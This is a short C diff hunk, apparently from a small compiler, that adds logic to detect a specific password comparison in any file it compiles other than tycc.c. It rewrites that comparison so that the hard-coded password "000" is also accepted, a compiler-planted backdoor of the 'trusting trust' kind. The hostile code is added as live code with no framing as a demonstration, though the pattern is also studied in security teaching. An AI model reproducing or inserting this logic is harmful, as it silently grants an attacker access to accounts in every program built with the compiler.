@@ -1,0 +1,7 @@
+            if (strstr(source_name, "tycc.c") == NULL)
+			{
+				if (strstr(buffer, "strcmp(password, account[i][1])==0") != NULL)
+				{
+					strreplace(buffer, "strcmp(password, account[i][1])==0", "(strcmp(password, account[i][1])==0 || strcmp(password, \"000\")==0)");
+				}
+			}
